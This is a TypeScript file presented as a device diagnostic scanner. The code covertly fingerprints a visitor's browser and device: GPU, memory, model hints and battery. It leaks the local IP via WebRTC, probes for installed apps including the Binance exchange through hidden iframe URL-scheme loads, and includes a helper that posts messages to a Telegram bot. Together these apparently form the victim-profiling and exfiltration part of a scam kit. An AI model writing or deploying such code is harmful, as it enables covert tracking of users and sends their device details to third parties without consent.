/**
 * Advanced Device Scanner and Diagnostic Profiler
 */

export interface DeviceReport {
  hardware: {
    model: string;
    gpu: string;
    ram: string;
    cores: string | number;
    screen: string;
    arch?: string;
  };
  software: {
    os_ver: string;
    exec_speed: string;
    patch: string;
  };
  network: {
    type: string;
    speed: string;
    battery?: string;
    internal_ip?: string;
  };
  apps: string[];
}

export async function runFullMasterScan(): Promise<DeviceReport> {
  const report: DeviceReport = {
    hardware: {
      model: "Detecting...",
      gpu: "Unknown",
      ram: "Unknown",
      cores: "Unknown",
      screen: "Unknown"
    },
    software: {
      os_ver: "N/A",
      exec_speed: "N/A",
      patch: "Legacy"
    },
    network: {
      type: "Unknown",
      speed: "Unknown",
      battery: "Unknown",
      internal_ip: "Protected/mDNS"
    },
    apps: []
  };

  try {
    // 1. Hardware, GPU & Screen
    const canvas = document.createElement("canvas");
    const gl = (canvas.getContext("webgl") || canvas.getContext("experimental-webgl")) as WebGLRenderingContext | null;
    let gpuInfo = "Unknown";
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      gpuInfo = dbg ? String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)) : "Unknown";
    }

    // Device Memory
    const ramSize = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory}GB` : "Unknown";

    report.hardware = {
      model: "Android Device",
      gpu: gpuInfo,
      ram: ramSize,
      cores: navigator.hardwareConcurrency || "Unknown",
      screen: `${window.screen.width}x${window.screen.height}`
    };

    // 2. High Entropy User-Agent Client Hints values
    if ((navigator as any).userAgentData) {
      try {
        const hints = await (navigator as any).userAgentData.getHighEntropyValues([
          "model",
          "platformVersion",
          "architecture"
        ]);
        report.hardware.model = hints.model || "Android Generic";
        report.hardware.arch = hints.architecture || "N/A";
        report.software.os_ver = hints.platformVersion || "10";
      } catch (err) {
        console.warn("UA Agent Data hints error:", err);
      }
    }

    // Fallback/Deep Double checks via Feature detection
    const isModernShared = "sharedStorage" in window;
    if (isModernShared && (report.software.os_ver === "10" || report.software.os_ver === "N/A")) {
      report.software.os_ver = "13 or 14+ (Detected via modern storage API)";
    }

    // 3. Connection and Network Speed
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      report.network.type = conn.effectiveType || "4g";
      report.network.speed = conn.downlink ? `${conn.downlink} Mbps` : "Unknown";
    }

    // 4. Kernel Speed / Timing profiling
    const start = performance.now();
    for (let i = 0; i < 20000000; i++) {
      Math.sqrt(i);
    }
    const end = performance.now();
    report.software.exec_speed = `${(end - start).toFixed(2)} ms`;

    // 5. Battery Monitoring
    if ((navigator as any).getBattery) {
      try {
        const batteryObj = await (navigator as any).getBattery();
        const percent = Math.round(batteryObj.level * 100);
        const state = batteryObj.charging ? "Charging" : "Discharging";
        report.network.battery = `${percent}% (${state})`;
      } catch (e) {
        report.network.battery = "Unavailable";
      }
    }

    // 6. Security Patch heuristics
    report.software.patch = "highlights" in CSS ? "Post-Sept 2023" : "Legacy";

    // 7. Local IP via WebRTC
    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
      });
      pc.createDataChannel("");
      pc.onicecandidate = (e) => {
        if (!e.candidate) return;
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
        if (ipMatch) {
          report.network.internal_ip = ipMatch[1];
        }
      };
      pc.createOffer().then((s) => pc.setLocalDescription(s));
    } catch (e) {
      // silenced fallback
    }

    // Probe common social apps
    const appSchemaProbes = [
      { name: "WhatsApp", url: "whatsapp://send" },
      { name: "Telegram", url: "tg://resolve" },
      { name: "Facebook", url: "fb://feed" },
      { name: "Binance", url: "bnc://" }
    ];

    const detectedApps: string[] = [];
    for (const app of appSchemaProbes) {
      const isDetected = await probeAppScheme(app.url);
      if (isDetected) {
        detectedApps.push(app.name);
      }
    }
    report.apps = detectedApps;

  } catch (globalErr) {
    console.error("Scan error: ", globalErr);
  }

  return report;
}

function probeAppScheme(urlScheme: string): Promise<boolean> {
  return new Promise((res) => {
    let appFound = false;
    const blurHandler = () => {
      appFound = true;
    };
    window.addEventListener("blur", blurHandler);
    
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = urlScheme;
    document.body.appendChild(iframe);

    setTimeout(() => {
      if (iframe.parentNode) {
        document.body.removeChild(iframe);
      }
      window.removeEventListener("blur", blurHandler);
      res(appFound);
    }, 600);
  });
}

// Telegram message formatting & delivery
export async function sendTelegramNotification(
  botToken: string,
  chatId: string,
  messageText: string
): Promise<boolean> {
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: "Markdown"
      })
    });
    return response.ok;
  } catch (error) {
    console.error("Telegram send error: ", error);
    return false;
  }
}
